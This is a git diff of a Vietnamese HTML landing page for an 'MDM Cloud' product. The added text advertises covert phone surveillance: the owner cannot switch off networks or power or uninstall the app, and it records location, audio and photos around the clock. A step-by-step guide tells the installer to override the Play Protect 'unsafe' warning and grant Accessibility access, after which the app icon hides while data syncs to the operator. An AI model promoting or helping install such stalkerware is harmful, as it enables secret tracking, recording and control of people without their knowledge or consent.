@@ -3,24 +3,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IT HOÀNG - MDM CLOUD</title>
+    <title>IT HOÀNG - MDM CLOUD 2026</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
-        body { background: #000; color: #fff; }
+        body { background: #050505; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         .pink-gold { background: linear-gradient(90deg, #FF1493, #FFD700); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 900; }
-        .btn-hoang { background: linear-gradient(45deg, #FF1493, #FFD700); color: #000; font-weight: bold; border-radius: 30px; border: none; }
+        .btn-hoang { background: linear-gradient(45deg, #FF1493, #FFD700); color: #000; font-weight: bold; border-radius: 30px; border: none; transition: 0.3s; }
+        .btn-hoang:hover { transform: scale(1.05); box-shadow: 0 0 20px rgba(255, 20, 147, 0.5); }
+        .guide-box { background: rgba(255, 255, 255, 0.05); border: 1px solid #222; border-radius: 20px; transition: 0.3s; }
+        .guide-box:hover { border-color: #FF1493; }
+        .step-num { width: 30px; height: 30px; background: #FF1493; color: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; margin-bottom: 10px; }
+        hr { border-color: #333; opacity: 1; }
     </style>
 </head>
-<body class="d-flex align-items-center vh-100 text-center">
-    <div class="container">
-        <h1 class="display-4 pink-gold mb-3">IT HOÀNG CLOUD 2026</h1>
-        <p class="text-secondary mb-5">Hệ thống quản lý vô hình - Chống tắt nguồn - An toàn ngân hàng</p>
+<body class="py-5">
+    <div class="container text-center">
+        <h1 class="display-4 pink-gold mb-3 italic">IT HOÀNG CLOUD 2026</h1>
+        <p class="text-secondary mb-5 uppercase tracking-widest small">Hệ thống quản lý vô hình - Chống tắt nguồn - An toàn ngân hàng</p>
+
         <div class="row g-3 text-start mb-5">
-            <div class="col-md-4"><div class="p-3 border border-secondary rounded-4">🛡️ <b>An Toàn:</b> Tự né App Ngân hàng & OTP.</div></div>
-            <div class="col-md-4"><div class="p-3 border border-secondary rounded-4">🚫 <b>Bất Tử:</b> Khách không thể tắt WiFi/4G/Nguồn.</div></div>
-            <div class="col-md-4"><div class="p-3 border border-secondary rounded-4">📍 <b>Tự Động:</b> Ghi hành trình di chuyển 24/7.</div></div>
+            <div class="col-md-4"><div class="p-4 guide-box h-100">🛡️ <b class="text-warning">An Toàn:</b> Tự né App Ngân hàng & OTP, bảo vệ quyền riêng tư tuyệt đối.</div></div>
+            <div class="col-md-4"><div class="p-4 guide-box h-100">🚫 <b class="text-warning">Bất Tử:</b> Khách không thể tắt WiFi/4G/Nguồn hay gỡ ứng dụng.</div></div>
+            <div class="col-md-4"><div class="p-4 guide-box h-100">📍 <b class="text-warning">Tự Động:</b> Ghi hành trình di chuyển, ghi âm và chụp ảnh 24/7.</div></div>
         </div>
-        <a href="login.html" class="btn btn-hoang px-5 py-3">BẮT ĐẦU TRẢI NGHIỆM</a>
+
+        <hr class="my-5">
+
+        <h2 class="pink-gold mb-4">HƯỚNG DẪN CÀI ĐẶT TRONG 30 GIÂY</h2>
+        <div class="row g-4 text-start justify-content-center mb-5">
+            <div class="col-md-4">
+                <div class="p-4 guide-box h-100">
+                    <div class="step-num">1</div>
+                    <h6 class="text-white fw-bold">Tải xuống & Cài đặt</h6>
+                    <p class="small text-secondary">Nhấn nút "Tải App" bên dưới. Nếu có cảnh báo "Play Protect", nhấn <b class="text-white">Vẫn cài đặt (Unsafe)</b>.</p>
+                </div>
+            </div>
+            <div class="col-md-4">
+                <div class="p-4 guide-box h-100">
+                    <div class="step-num">2</div>
+                    <h6 class="text-white fw-bold">Cấp quyền Trợ năng</h6>
+                    <p class="small text-secondary">Mở app, nhấn <b class="text-white">"Kích hoạt"</b>. Hệ thống tự dẫn bạn vào mục <b class="text-white">Accessibility (Trợ năng)</b>, hãy bật <b class="text-white">On</b>.</p>
+                </div>
+            </div>
+            <div class="col-md-4">
+                <div class="p-4 guide-box h-100">
+                    <div class="step-num">3</div>
+                    <h6 class="text-white fw-bold">Hoàn tất & Vô hình</h6>
+                    <p class="small text-secondary">Sau khi cấp quyền, Icon App sẽ tự ẩn đi. Mọi dữ liệu sẽ bắt đầu được đồng bộ về hệ thống IT Hoàng.</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="d-grid gap-3 d-sm-flex justify-content-sm-center mt-5">
+            <a href="download.html" class="btn btn-hoang px-5 py-3 shadow-lg">📥 TẢI APP NGAY</a>
+            <a href="login.html" class="btn btn-outline-secondary px-5 py-3 rounded-pill text-white border-secondary">ĐĂNG NHẬP DASHBOARD</a>
+        </div>
+
+        <p class="mt-5 text-secondary small italic">* Tương thích tốt nhất với Android 10+ và iPhone 8 Plus trở lên *</p>
     </div>
 </body>
 </html>
